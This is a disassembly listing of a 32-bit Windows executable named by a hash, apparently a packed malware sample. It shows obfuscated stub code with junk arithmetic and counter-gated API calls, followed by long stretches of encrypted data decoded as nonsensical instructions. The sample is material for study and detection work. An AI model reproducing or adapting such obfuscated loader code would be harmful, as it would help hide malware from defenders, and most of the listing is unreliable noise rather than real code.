
b574ce543ecf88bf6e232af828074e55864ed7065a471bdd10dd3a14d07cdd74.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	sbb    DWORD PTR ds:0x43460b,ecx
  40100c:	mov    eax,ds:0x414afe
  401011:	mov    eax,DWORD PTR [eax+0x198]
  401017:	mov    DWORD PTR [ebp-0x8],eax
  40101a:	add    eax,DWORD PTR ds:0x4344e3
  401020:	mov    eax,DWORD PTR [ebp+0x8]
  401023:	dec    DWORD PTR ds:0x434553
  401029:	mov    ecx,DWORD PTR [ebp-0x8]
  40102c:	sbb    DWORD PTR ds:0x4344f3,0x434547
  401036:	push   ebx
  401037:	push   esi
  401038:	sub    DWORD PTR ds:0x43460b,ebx
  40103e:	mov    esi,0x7510851
  401043:	mov    DWORD PTR ds:0x43453b,0x10
  40104d:	cmp    DWORD PTR ds:0x43453b,0x0
  401054:	je     0x4010ad
  40105a:	cmp    DWORD PTR ds:0x43453b,0x2
  401061:	jne    0x40107b
  401067:	push   DWORD PTR [ebp-0x1c]
  40106a:	push   DWORD PTR [ebp-0x18]
  40106d:	push   DWORD PTR [ebp-0x24]
  401070:	push   0x7fb5
  401075:	call   DWORD PTR ds:0x4130b4
  40107b:	cmp    DWORD PTR ds:0x43453b,0x3
  401082:	jne    0x401095
  401088:	mov    ebx,DWORD PTR ds:0x43453b
  40108e:	dec    ebx
  40108f:	mov    DWORD PTR ds:0x43453b,ebx
  401095:	mov    ebx,DWORD PTR ds:0x43453b
  40109b:	dec    ebx
  40109c:	mov    DWORD PTR ds:0x43453b,ebx
  4010a2:	jmp    0x40104d
  4010a7:	adc    DWORD PTR ds:0x43460f,ecx
  4010ad:	xor    eax,esi
  4010af:	push   edi
  4010b0:	mov    edi,DWORD PTR ds:0x43455f
  4010b6:	mov    ebx,DWORD PTR ds:0x434633
  4010bc:	sub    ebx,edi
  4010be:	imul   edi,DWORD PTR [edi+ebx*1]
  4010c2:	mov    edi,0x327299
  4010c7:	adc    DWORD PTR ds:0x434507,0x43458b
  4010d1:	add    eax,edi
  4010d3:	and    DWORD PTR ds:0x43458f,0x0
  4010dd:	jmp    0x4010ef
  4010e2:	mov    ebx,DWORD PTR ds:0x43458f
  4010e8:	inc    ebx
  4010e9:	mov    DWORD PTR ds:0x43458f,ebx
  4010ef:	cmp    DWORD PTR ds:0x43458f,0x1d
  4010f6:	jae    0x401312
  4010fc:	cmp    DWORD PTR ds:0x43458f,0xe
  401103:	jne    0x401119
  401109:	push   0x4344eb
  40110e:	push   0x43485b
  401113:	call   DWORD PTR ds:0x41332c
  401119:	cmp    DWORD PTR ds:0x43458f,0xd
  401120:	jne    0x401133
  401126:	mov    ebx,DWORD PTR ds:0x43458f
  40112c:	inc    ebx
  40112d:	mov    DWORD PTR ds:0x43458f,ebx
  401133:	jmp    0x4010e2
  401138:	or     DWORD PTR ds:0x4344eb,ebx
  40113e:	jmp    0x401312
  401143:	test   ah,ch
  401145:	push   edx
  401146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401147:	jb     0x4010fd
  401149:	jl     0x401137
  40114b:	pop    eax
  40114c:	or     eax,0x4db21829
  401151:	mov    es,WORD PTR [edi+0x7e]
  401154:	jle    0x4011d4
  401156:	jle    0x40110d
  401158:	jg     0x4011d8
  40115a:	jle    0x40112a
  40115c:	xlat   BYTE PTR ds:[ebx]
  40115d:	cmp    ecx,edx
  40115f:	(bad)
  401162:	(bad)  
  401164:	pop    es
  401165:	add    BYTE PTR [ebx],al
  401167:	movzx  ecx,WORD PTR [edi+ecx*1]
  40116b:	xor    ecx,DWORD PTR [edi]
  40116d:	int3   
  40116e:	and    al,0xc7
  401170:	sbb    al,0x1f
  401172:	inc    ebp
  401173:	fs or  al,0xb7
  401176:	(bad)  [esi]
  401178:	out    dx,eax
  401179:	mov    ecx,0x8e03d6db
  40117e:	es mov esi,0x114da2f0
  401184:	test   eax,0x661f46de
  401189:	call   0x985d1cfd
  40118e:	add    al,0xd6
  401190:	dec    esp
  401191:	stos   BYTE PTR es:[edi],al
  401192:	push   ebx
  401193:	sub    ebp,ebx
  401195:	sar    BYTE PTR [eax],0xa9
  401198:	mov    bh,BYTE PTR [ebx-0x3f]
  40119b:	stos   DWORD PTR es:[edi],eax
  40119c:	push   es
  40119d:	rcl    bl,0x8d
  4011a0:	test   esi,edx
  4011a2:	pushf  
  4011a3:	(bad)
  4011a6:	mov    esi,ebp
  4011a8:	dec    edi
  4011a9:	out    0xa6,al
  4011ab:	dec    ebp
  4011ac:	call   DWORD PTR [edi-0x254af85c]
  4011b2:	mov    ecx,0x5136e949
  4011b7:	and    esi,DWORD PTR [edx-0x47619116]
  4011bd:	jnp    0x4011dc
  4011bf:	ret    
  4011c0:	xchg   edx,eax
  4011c1:	sub    eax,0xc25eebd0
  4011c6:	loopne 0x40120c
  4011c8:	cld    
  4011c9:	jmp    0xd761:0x70cf3d92
  4011d0:	sub    al,0xc9
  4011d2:	add    ah,ch
  4011d4:	sbb    eax,0x331a65d
  4011d9:	outs   dx,DWORD PTR ds:[esi]
  4011da:	ins    DWORD PTR es:[edi],dx
  4011db:	add    al,0x14
  4011dd:	cmp    eax,0x34508ed9
  4011e2:	jno    0x401263
  4011e4:	(bad)
  4011e9:	or     ebx,DWORD PTR [ebx+0x51]
  4011ec:	(bad)  
  4011ee:	adc    eax,0x25e558d3
  4011f3:	jge    0x401193
  4011f5:	inc    esi
  4011f6:	dec    ebx
  4011f7:	aaa    
  4011f8:	adc    DWORD PTR [ebx],ebp
  4011fa:	ja     0x401231
  4011fc:	sbb    dl,bl
  4011fe:	ds dec edi
  401200:	hlt    
  401201:	enter  0xba0,0x78
  401205:	ins    BYTE PTR es:[edi],dx
  401206:	retf   
  401207:	cli    
  401208:	ins    BYTE PTR es:[edi],dx
  401209:	ins    DWORD PTR es:[edi],dx
  40120a:	jl     0x401190
  40120c:	pop    es
  40120d:	loopne 0x40126e
  40120f:	pop    ecx
  401210:	sbb    ebx,esi
  401212:	es push esp
  401214:	mov    dh,0x7e
  401216:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  401218:	xchg   BYTE PTR [eax],bh
  40121a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40121b:	mov    esi,0x3dcea02d
  401220:	add    BYTE PTR ds:[eax-0x7d642fb7],dh
  401227:	aas    
  401228:	xor    BYTE PTR [edi+ecx*8+0x1b8a135],dh
  40122f:	jmp    0x6492:0x526d2d76
  401236:	fwait
  401237:	xchg   esp,eax
  401238:	daa    
  401239:	and    eax,0x485ed2b1
  40123e:	aad    0xd8
  401240:	push   ebx
  401241:	inc    esi
  401242:	jp     0x4012a2
  401244:	or     eax,0x18b028fa
  401249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40124a:	pop    es
  40124b:	inc    edx
  40124c:	leave  
  40124d:	test   DWORD PTR [ecx],edi
  40124f:	dec    esp
  401250:	mov    dh,0x82
  401252:	std    
  401253:	imul   esi,DWORD PTR [ebx-0x4d630c11],0x5de58201
  40125d:	test   BYTE PTR [ebx+0x5553d8d7],dh
  401263:	sbb    dl,BYTE PTR ds:0x9dfa9857
  401269:	cmp    edx,DWORD PTR [ecx+eax*4-0x7b]
  40126d:	retf   
  40126e:	test   al,0x4
  401270:	not    BYTE PTR [esi+ecx*4+0x72132a79]
  401277:	cmc    
  401278:	or     esi,DWORD PTR [ecx+0x1e]
  40127b:	call   0xf03239d6
  401280:	es pop edx
  401282:	add    edx,eax
  401284:	xlat   BYTE PTR ds:[ebx]
  401285:	pop    edi
  401286:	in     eax,0x6c
  401288:	add    cl,BYTE PTR [ebp+edx*1-0x17]
  40128c:	xor    al,0x5d
  40128e:	and    DWORD PTR [edi-0x416048a2],edi
  401294:	int3   
  401295:	cmp    al,0x89
  401297:	(bad)  
  401298:	sahf   
  401299:	loope  0x4012e4
  40129b:	push   ebp
  40129c:	xchg   edx,eax
  40129d:	test   BYTE PTR gs:[edi],ah
  4012a0:	mov    ecx,0x319a4d56
  4012a5:	imul   edi,edx,0x73
  4012a8:	call   0x76ddfa7f
  4012ad:	pop    ss
  4012ae:	imul   edx,DWORD PTR [eax-0x53],0xe784aabb
  4012b5:	jbe    0x40131a
  4012b7:	cli    
  4012b8:	mov    cl,0x7a
  4012ba:	jmp    0x401269
  4012bc:	sub    ecx,edi
  4012be:	fcomi  st,st(7)
  4012c0:	or     DWORD PTR [ebp+0x40bd263c],0xfb6133f9
  4012ca:	aad    0x9d
  4012cc:	leave  
  4012cd:	mov    ch,ch
  4012cf:	out    0x42,eax
  4012d1:	mov    BYTE PTR [eax-0x215713fe],dl
  4012d7:	call   0xfd478fdd
  4012dc:	jbe    0x401313
  4012de:	mov    bl,0x55
  4012e0:	fcom   QWORD PTR [ebp-0x11]
  4012e3:	cmp    ch,BYTE PTR [esi-0x6e1658a7]
  4012e9:	cdq    
  4012ea:	in     eax,dx
  4012eb:	aad    0xc
  4012ed:	xor    al,0x72
  4012ef:	dec    edx
  4012f0:	or     al,0xec
  4012f2:	div    BYTE PTR [esi-0x18822b78]
  4012f8:	stos   BYTE PTR es:[edi],al
  4012f9:	mov    WORD PTR [ebp-0x2a],cs
  4012fc:	jle    0x40130e
  4012fe:	inc    ebx
  4012ff:	aas    
  401300:	std    
  401301:	xchg   edi,eax
  401302:	xchg   ecx,eax
  401303:	jmp    0x7e85:0x4d687e30
  40130a:	imul   eax,DWORD PTR [ecx],0x22fa58d4
  401310:	mov    BYTE PTR [ecx],cl
  401312:	mov    DWORD PTR [ecx],eax
  401314:	adc    ecx,0x1222
  40131a:	lea    eax,[ebp-0x4]
  40131d:	xor    DWORD PTR ds:0x43457f,0x53dc
  401327:	mov    DWORD PTR [ebp-0x10],eax
  40132a:	adc    DWORD PTR ds:0x43453f,edi
  401330:	mov    eax,DWORD PTR [ebp+0x8]
  401333:	or     DWORD PTR ds:0x4344ef,0x4344e3
  40133d:	mov    ecx,DWORD PTR [ebp-0x10]
  401340:	xor    DWORD PTR ds:0x4344f3,ebx
  401346:	xor    eax,esi
  401348:	neg    ebx
  40134a:	add    eax,edi
  40134c:	mov    DWORD PTR [ecx],eax
  40134e:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  401355:	lea    eax,[ebp-0x14]
  401358:	sbb    ecx,ecx
  40135a:	mov    DWORD PTR [ebp-0x20],eax
  40135d:	mov    eax,DWORD PTR [ebp-0x14]
  401360:	mov    ecx,DWORD PTR [ebp-0x20]
  401363:	and    DWORD PTR ds:0x4345c3,0x0
  40136d:	xor    ebx,ebx
  40136f:	add    ebx,DWORD PTR ds:0x4345c3
  401375:	inc    ebx
  401376:	mov    DWORD PTR ds:0x4345c3,ebx
  40137c:	cmp    DWORD PTR ds:0x4345c3,0x9
  401383:	jne    0x401394
  401389:	push   0x3702
  40138e:	call   DWORD PTR ds:0x4130b8
  401394:	cmp    DWORD PTR ds:0x4345c3,0x8
  40139b:	jne    0x4013ae
  4013a1:	mov    ebx,DWORD PTR ds:0x4345c3
  4013a7:	inc    ebx
  4013a8:	mov    DWORD PTR ds:0x4345c3,ebx
  4013ae:	cmp    DWORD PTR ds:0x4345c3,0x1c
  4013b5:	jb     0x40136d
  4013bb:	add    DWORD PTR ds:0x43453f,ecx
  4013c1:	xor    eax,esi
  4013c3:	add    eax,edi
  4013c5:	mov    DWORD PTR [ecx],eax
  4013c7:	dec    DWORD PTR ds:0x43458b
  4013cd:	mov    eax,ds:0x414bd2
  4013d2:	mov    ebx,0x8e12febf
  4013d7:	mov    DWORD PTR [ebp-0xc],ebx
  4013da:	sbb    DWORD PTR ds:0x4344ef,0x43453f
  4013e4:	mov    eax,DWORD PTR [eax]
  4013e6:	adc    DWORD PTR ds:0x4344eb,0x4345f7
  4013f0:	mov    cx,WORD PTR [ebp-0x4]
  4013f4:	xor    DWORD PTR ds:0x434503,0x1391
  4013fe:	movzx  ecx,cx
  401401:	add    ecx,DWORD PTR [eax]
  401403:	mov    DWORD PTR [ebp-0x18],ecx
  401406:	jmp    0x4015da
  40140b:	fisub  DWORD PTR [esi]
  40140d:	add    BYTE PTR [ecx],0x42
  401410:	lods   eax,DWORD PTR ds:[esi]
  401411:	gs in  eax,dx
  401413:	aam    0x1e
  401415:	dec    edx
  401416:	xchg   esi,edi
  401418:	imul   eax,DWORD PTR [edx],0x7e7fb566
  40141e:	jle    0x4013d5
  401420:	jg     0x4014a0
  401422:	jle    0x401425
  401424:	pop    esp
  401425:	push   ebp
  401426:	pusha  
  401427:	aas    
  401428:	push   cs
  401429:	pop    ds
  40142a:	leave  
  40142b:	adc    esp,DWORD PTR [eax+ebp*1-0x15]
  40142f:	push   cs
  401430:	fld    QWORD PTR [ecx-0x1d19089e]
  401436:	je     0x401489
  401438:	push   0xd
  40143a:	popa   
  40143b:	jne    0x4014af
  40143d:	sbb    ch,BYTE PTR [ebx+esi*1-0x45b80779]
  401444:	push   ebx
  401445:	or     dl,BYTE PTR [esi-0x25]
  401448:	dec    ebp
  401449:	pop    edi
  40144a:	aas    
  40144b:	daa    
  40144c:	adc    dh,BYTE PTR [esi-0x1a]
  40144f:	push   0xffffffc6
  401451:	or     edx,DWORD PTR [esi+0x74]
  401454:	pop    ss
  401455:	push   ecx
  401456:	pop    esi
  401457:	or     eax,0x382978d6
  40145c:	sub    eax,0xd507f3e8
  401461:	adc    edx,DWORD PTR [ebx+eax*2-0x1e]
  401465:	mov    ebx,0xebcf1893
  40146a:	div    DWORD PTR [ebx-0x8034640]
  401470:	sti    
  401471:	cmp    ch,BYTE PTR [esi-0x5780847f]
  401477:	and    esp,0xa8206086
  40147d:	xor    BYTE PTR [esi+0x45],ch
  401480:	lahf   
  401481:	imul   ebp,DWORD PTR [eax-0x13],0x48
  401485:	add    ebp,DWORD PTR [ebx]
  401487:	arpl   WORD PTR [edi+0x4135f882],sp
  40148d:	loop   0x4014dd
  40148f:	push   ebp
  401490:	cld    
  401491:	ins    BYTE PTR es:[edi],dx
  401492:	or     DWORD PTR ss:[esi-0x5b9c85ba],edi
  401499:	fbld   TBYTE PTR [edx]
  40149b:	mov    esp,0x51cc7479
  4014a0:	push   ebx
  4014a1:	fadd   st,st(7)
  4014a3:	sbb    bl,BYTE PTR [ecx]
  4014a5:	ret    
  4014a6:	mov    ebx,eax
  4014a8:	call   0x8b2a2da2
  4014ad:	jp     0x4014b4
  4014af:	mov    eax,ds:0x60600d2
  4014b4:	pushf  
  4014b5:	inc    eax
  4014b6:	pusha  
  4014b7:	aad    0x5e
  4014b9:	ja     0x4014ab
  4014bb:	retf   0xcb2c
  4014be:	lea    eax,[ecx-0x1337f088]
  4014c4:	xor    eax,DWORD PTR [eax+0x1f]
  4014c7:	iret   
  4014c8:	lods   al,BYTE PTR ds:[esi]
  4014c9:	mov    es,WORD PTR ds:0xe2037d06
  4014cf:	mov    ds:0x87dd1d41,al
  4014d4:	in     eax,dx
  4014d5:	push   edx
  4014d6:	or     BYTE PTR [edx],al
  4014d8:	out    0x71,al
  4014da:	dec    esp
  4014db:	das    
  4014dc:	iret   
  4014dd:	sahf   
  4014de:	pushf  
  4014df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014e0:	jno    0x401480
  4014e2:	pop    es
  4014e3:	lahf   
  4014e4:	addr16 adc esp,ebx
  4014e7:	retf   
  4014e8:	jmp    0x401567
  4014ea:	dec    ecx
  4014eb:	xchg   edi,eax
  4014ec:	mov    eax,ds:0x4cd6e090
  4014f1:	pop    eax
  4014f2:	push   0xffffffbf
  4014f4:	fs jge 0x4014b0
  4014f7:	jbe    0x401544
  4014f9:	cmp    eax,0x6793ceb0
  4014fe:	mov    edx,0x564c711b
  401503:	mov    ds:0xb7db91bf,eax
  401508:	mov    ?,WORD PTR [eax]
  40150a:	clc    
  40150b:	sbb    BYTE PTR [esi-0x147be1f3],ah
  401511:	ds push 0xffffff92
  401514:	inc    ebp
  401515:	stc    
  401516:	jb     0x4014ff
  401518:	(bad)  
  401519:	test   eax,0xe6d3bb24
  40151e:	inc    ecx
  40151f:	mov    edi,0xd1fc4cb9
  401524:	shl    ebx,0x4c
  401527:	add    eax,ebp
  401529:	test   eax,0xa70ea48b
  40152e:	or     eax,0x4ad6dd0b
  401533:	dec    edx
  401534:	inc    edi
  401535:	nop
  401536:	add    DWORD PTR [ebp-0x495a0127],0xedf4d5d3
  401540:	adc    al,0x31
  401542:	js     0x3f49587d
  401548:	pop    ebx
  401549:	loop   0x401505
  40154b:	data16 fistp QWORD PTR [ebx+0x17062464]
  401552:	pop    edi
  401553:	rcr    esp,0xa2
  401556:	shr    DWORD PTR [ebx-0x7],0xd6
  40155a:	in     eax,0x81
  40155c:	jns    0x401599
  40155e:	push   esp
  40155f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401560:	iret   
  401561:	loopne 0x401571
  401563:	add    esi,DWORD PTR [esi+0x1]
  401566:	jae    0x401572
  401568:	call   0xa106:0x327e54ec
  40156f:	rol    DWORD PTR [edx-0x7266f64c],1
  401575:	in     eax,0xa9
  401577:	loope  0x401555
  401579:	push   ecx
  40157a:	dec    edx
  40157b:	sub    DWORD PTR [esi],ecx
  40157d:	sti    
  40157e:	jmp    0x401548
  401580:	jns    0x4015de
  401582:	popf   
  401583:	fidivr DWORD PTR [edx-0x3e]
  401586:	addr16 mov ch,0x5a
  401589:	jle    0x40152b
  40158b:	jns    0x4015ad
  40158d:	hlt    
  40158e:	push   eax
  40158f:	sbb    DWORD PTR [ecx],edi
  401591:	stc    
  401592:	cmc    
  401593:	sub    al,bh
  401595:	mov    al,fs:0x9d2dc3fd
  40159b:	enter  0x9473,0xdc
  40159f:	repz mov ebp,0x62a56618
  4015a5:	dec    esi
  4015a6:	jp     0x4015ef
  4015a8:	jbe    0x4015ea
  4015aa:	aam    0xbb
  4015ac:	sub    eax,0x33ee6a77
  4015b1:	cli    
  4015b2:	dec    esp
  4015b3:	aas    
  4015b4:	ins    DWORD PTR es:[edi],dx
  4015b5:	cld    
  4015b6:	test   al,0xc0
  4015b8:	adc    al,ah
  4015ba:	mov    edi,0xb103085
  4015bf:	dec    edi
  4015c0:	aad    0xce
  4015c2:	sbb    DWORD PTR [edi-0x1c45debb],0x16
  4015c9:	inc    ebx
  4015ca:	adc    eax,0x590a0bd7
  4015cf:	fsubr  QWORD PTR [esi+0x2]
  4015d2:	test   BYTE PTR [ebx-0x67c11090],bl
  4015d8:	(bad)  
  4015da:	mov    eax,DWORD PTR [ebp+0x8]
  4015dd:	mov    ecx,DWORD PTR ds:0x43460f
  4015e3:	and    DWORD PTR ds:0x4345bf,ecx
  4015e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4015ec:	xor    eax,esi
  4015ee:	add    DWORD PTR ds:0x4344e3,0x598
  4015f8:	add    eax,edi
  4015fa:	mov    DWORD PTR ds:0x434543,0x7c6b
  401604:	cmp    DWORD PTR [ecx],eax
  401606:	mov    DWORD PTR ds:0x434593,0x6dd9
  401610:	jne    0x40227a
  401616:	and    DWORD PTR ds:0x434583,0x0
  401620:	mov    ecx,DWORD PTR ds:0x434583
  401626:	inc    ecx
  401627:	mov    DWORD PTR ds:0x434583,ecx
  40162d:	cmp    DWORD PTR ds:0x434583,0x4
  401634:	jne    0x401645
  40163a:	push   0x2f81
  40163f:	call   DWORD PTR ds:0x413270
  401645:	cmp    DWORD PTR ds:0x434583,0x3
  40164c:	jne    0x40165f
  401652:	mov    ecx,DWORD PTR ds:0x434583
  401658:	inc    ecx
  401659:	mov    DWORD PTR ds:0x434583,ecx
  40165f:	cmp    DWORD PTR ds:0x434583,0x14
  401666:	jb     0x401620
  40166c:	xor    ecx,ecx
  40166e:	or     ecx,DWORD PTR ds:0x434523
  401674:	mov    eax,ds:0x43456b
  401679:	sub    eax,ecx
  40167b:	and    ecx,DWORD PTR [ecx+eax*1]
  40167e:	mov    eax,DWORD PTR [ebp+0x8]
  401681:	mov    ecx,DWORD PTR [ebp-0x18]
  401684:	add    DWORD PTR ds:0x4345cb,0x4345f7
  40168e:	xor    eax,esi
  401690:	or     DWORD PTR ds:0x4344eb,0x526e
  40169a:	add    eax,edi
  40169c:	mov    DWORD PTR ds:0x4344ef,0x6068
  4016a6:	cmp    DWORD PTR [ecx],eax
  4016a8:	jmp    0x40187c
  4016ad:	cmp    dh,BYTE PTR [esi]
  4016af:	sub    eax,0x6255fdb9
  4016b4:	mov    ebp,0xf85a51d5
  4016b9:	inc    eax
  4016ba:	xchg   ebp,eax
  4016bb:	sbb    al,0x90
  4016bd:	in     al,dx
  4016be:	jns    0x40173e
  4016c0:	jle    0x401677
  4016c2:	jg     0x401742
  4016c4:	jle    0x4016cc
  4016c6:	push   cs
  4016c7:	ins    BYTE PTR es:[edi],dx
  4016c8:	push   ss
  4016c9:	out    0xd7,al
  4016cb:	jecxz  0x40172f
  4016cd:	(bad)  [edi-0x5ee13a0b]
  4016d3:	cmp    BYTE PTR [edx-0x691c302c],0x2b
  4016da:	push   0xffffffe4
  4016dc:	mov    ecx,?
  4016de:	int    0x18
  4016e0:	(bad)  
  4016e2:	shl    BYTE PTR [esi+ecx*2-0x4dd8e623],cl
  4016e9:	adc    eax,0x693bbfd3
  4016ee:	das    
  4016ef:	jmp    FWORD PTR [ecx]
  4016f1:	inc    edi
  4016f2:	dec    esp
  4016f3:	dec    edi
  4016f4:	adc    DWORD PTR [esi],0x7613ab41
  4016fa:	call   0x466c:0x53179906
  401701:	outs   dx,BYTE PTR ds:[esi]
  401702:	es ss jp 0x4016c0
  401706:	sbb    esi,esp
  401708:	int3   
  401709:	dec    edi
  40170a:	shl    DWORD PTR [ecx+0x3e],1
  40170d:	loopne 0x401694
  40170f:	cmp    DWORD PTR [ebp-0x11231574],ebp
  401715:	sub    BYTE PTR [esp+ebx*2-0x22],ah
  401719:	leave  
  40171a:	jl     0x40170f
  40171c:	ins    DWORD PTR es:[di],dx
  40171e:	mov    edx,0xa74c0ad
  401723:	adc    al,0x51
  401725:	sub    al,0x2a
  401727:	lods   al,BYTE PTR ds:[esi]
  401728:	inc    eax
  401729:	jbe    0x40174f
  40172b:	icebp  
  40172c:	lods   al,BYTE PTR ds:[esi]
  40172d:	test   al,0xfa
  40172f:	mov    eax,ds:0x4fdde854
  401734:	loop   0x4016b7
  401736:	mov    BYTE PTR [edi-0x78],al
  401739:	retf   0xdd6a
  40173c:	aas    
  40173d:	dec    ebp
  40173e:	clc    
  40173f:	loope  0x40171f
  401741:	sbb    esi,DWORD PTR [esp+esi*8+0x7a]
  401745:	dec    esp
  401746:	outs   dx,DWORD PTR ds:[esi]
  401747:	xor    al,ch
  401749:	lods   eax,DWORD PTR ds:[esi]
  40174a:	imul   ecx,ecx,0xffffffcc
  40174d:	sar    DWORD PTR [ebx],1
  40174f:	or     al,0x12
  401751:	mov    bh,0xbc
  401753:	or     BYTE PTR [ecx],bl
  401755:	fsubp  st(6),st
  401757:	mov    dl,0xdf
  401759:	mov    ebp,0xe0318a5e
  40175e:	jmp    0x3510:0x9803480b
  401765:	adc    cl,BYTE PTR [eax-0x5391e922]
  40176b:	mov    ah,0xd3
  40176d:	and    al,BYTE PTR [ecx]
  40176f:	icebp  
  401770:	fstp   QWORD PTR [edi+edx*8]
  401773:	pop    esp
  401774:	and    BYTE PTR [ecx],dh
  401776:	inc    eax
  401777:	iret   
  401778:	and    BYTE PTR [esi+0x35],bl
  40177b:	dec    esi
  40177c:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40177e:	arpl   WORD PTR [ebx-0x5ffd6e90],sp
  401784:	clc    
  401785:	and    ch,BYTE PTR [edx-0x19]
  401788:	mov    dh,0xc5
  40178a:	add    al,0x7c
  40178c:	int    0xf8
  40178e:	out    0x3f,eax
  401790:	dec    edx
  401791:	stos   DWORD PTR es:[edi],eax
  401792:	leave  
  401793:	(bad)  
  401794:	xor    al,0xdd
  401796:	retf   
  401797:	(bad)  
  401799:	scas   al,BYTE PTR es:[edi]
  40179a:	fild   WORD PTR [edx]
  40179c:	loopne 0x40173f
  40179e:	test   bh,dl
  4017a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017a1:	test   BYTE PTR [ecx+0x4fa35f83],ah
  4017a7:	pop    ebx
  4017a8:	jae    0x4017b7
  4017aa:	lahf   
  4017ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017ac:	mov    ebp,0x80ce09aa
  4017b1:	(bad)  
  4017b2:	mov    dl,0xcb
  4017b4:	jecxz  0x40181c
  4017b6:	(bad)  
  4017b7:	jp     0x40182c
  4017b9:	mov    al,ds:0x47dd3cce
  4017be:	or     bh,ch
  4017c0:	push   esi
  4017c1:	mov    esi,0xbc706bc9
  4017c6:	fisttp WORD PTR [esi]
  4017c8:	mov    al,0x2
  4017ca:	bound  edi,QWORD PTR [esp+edi*8]
  4017cd:	add    DWORD PTR [esi+0x32d675a2],edx
  4017d3:	jnp    0x401780
  4017d5:	dec    ecx
  4017d6:	jnp    0x4017f3
  4017d8:	xor    ecx,esp
  4017da:	mov    BYTE PTR [ebp-0x79805c69],bl
  4017e0:	sbb    DWORD PTR [ecx+edi*2-0x46d6665a],eax
  4017e7:	push   edx
  4017e8:	nop
  4017e9:	in     eax,dx
  4017ea:	xor    eax,0xf3ffefab
  4017ef:	mov    ds:0x699b7d15,eax
  4017f4:	(bad)  
  4017f5:	jmp    0xdea3eaf7
  4017fa:	out    dx,al
  4017fb:	mov    dl,0xe6
  4017fd:	or     bl,dh
  4017ff:	shl    DWORD PTR [ebx],0xf9
  401802:	mul    DWORD PTR [ebx+0x469c329b]
  401808:	jo     0x40183e
  40180a:	scas   al,BYTE PTR es:[edi]
  40180b:	or     dl,BYTE PTR [esi-0x53]
  40180e:	test   BYTE PTR [ebp+0x209f00f5],bh
  401814:	(bad)  
  401816:	clc    
  401817:	push   esi
  401818:	ins    DWORD PTR es:[edi],dx
  401819:	sbb    BYTE PTR [ebx+0x36ba2331],dl
  40181f:	sbb    eax,0x8ef7d461
  401824:	cwde   
  401825:	out    dx,al
  401826:	arpl   WORD PTR [edx],bp
  401828:	stc    
  401829:	push   0x3e9d54e8
  40182e:	in     eax,0xc5
  401830:	mov    WORD PTR [edx-0x52],?
  401833:	or     ebp,esi
  401835:	rol    DWORD PTR [eax],1
  401837:	mov    bl,0xf8
  401839:	and    eax,DWORD PTR [ebx+0x6a]
  40183c:	lea    edx,[ebp+eiz*2-0x52]
  401840:	std    
  401841:	dec    esi
  401842:	xchg   esp,eax
  401843:	sbb    al,0x89
  401845:	bound  ebp,QWORD PTR [esi-0xef6aecc]
  40184b:	in     al,0x68
  40184d:	pop    esi
  40184e:	sbb    DWORD PTR [esi],esp
  401850:	into   
  401851:	addr16 inc esi
  401853:	adc    dl,BYTE PTR [ecx-0x49]
  401856:	xlat   BYTE PTR ds:[ebx]
  401857:	mov    dh,BYTE PTR [eax+0x36]
  40185a:	jg     0x40183c
  40185c:	or     DWORD PTR [ebx],ebp
  40185e:	inc    ecx
  40185f:	mov    BYTE PTR [edx],bl
  401861:	cmp    bl,bh
  401863:	jb     0x401862
  401865:	dec    BYTE PTR [esi]
  401867:	and    eax,0x92dfdb31
  40186c:	sub    eax,esi
  40186e:	inc    ebx
  40186f:	les    esp,FWORD PTR [edx+0xb]
  401872:	or     BYTE PTR [edx+0x38600576],ah
  401878:	push   ecx
  401879:	sti    
  40187a:	test   BYTE PTR [edi+ecx*1],dl
  40187d:	test   DWORD PTR [edi],esp
  40187f:	add    al,0x0
  401881:	add    BYTE PTR [ebx+0x4346030d],cl
  401887:	add    BYTE PTR [ecx],cl
  401889:	or     eax,0x4344e3
  40188e:	jmp    0x401a62
  401893:	or     esi,DWORD PTR [edi+eiz*2-0x2a]
  401897:	popa   
  401898:	(bad)  [ebx+0x728b6c7d]
  40189e:	sbb    ah,bh
  4018a0:	push   esi
  4018a1:	rol    DWORD PTR [edi+0x1b],0x7b
  4018a5:	jle    0x401925
  4018a7:	mov    ch,0x7f
  4018a9:	jle    0x401929
  4018ab:	sbb    eax,0x8e860f21
  4018b0:	dec    edi
  4018b1:	add    dl,bl
  4018b3:	in     al,dx
  4018b4:	pop    edx
  4018b5:	fwait
  4018b6:	push   esp
  4018b7:	mov    cl,0xd1
  4018b9:	add    ebp,esp
  4018bb:	pop    esp
  4018bc:	add    dl,dl
  4018be:	js     0x401842
  4018c0:	jmp    0x401904
  4018c2:	push   cs
  4018c3:	pop    ds
  4018c4:	fidiv  WORD PTR [eax+0x21237770]
  4018ca:	jg     0x4018f1
  4018cc:	pop    ss
  4018cd:	sbb    al,0xa7
  4018cf:	mov    esi,0xcfd995ff
  4018d4:	shl    DWORD PTR [esi],0xd0
  4018d7:	imul   esi,DWORD PTR [ebx-0x7f],0x45
  4018db:	jl     0x401932
  4018dd:	xor    eax,0xd2d4debf
  4018e2:	stc    
  4018e3:	and    DWORD PTR [edx-0xb],esi
  4018e6:	outs   dx,BYTE PTR ds:[esi]
  4018e7:	jb     0x4018dc
  4018e9:	cs or  ecx,esp
  4018ec:	sbb    eax,0x57f38ac0
  4018f1:	dec    edi
  4018f2:	xor    eax,0x315ce2e1
  4018f7:	pop    edi
  4018f8:	fadd   st(7),st
  4018fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018fb:	mov    bh,0x35
  4018fd:	and    al,0x20
  4018ff:	arpl   WORD PTR [edi-0x2a021af1],cx
  401905:	mov    cl,BYTE PTR [edi-0x61c88487]
  40190b:	jge    0x401964
  40190d:	idiv   BYTE PTR [eax-0x42]
  401910:	xlat   BYTE PTR ds:[ebx]
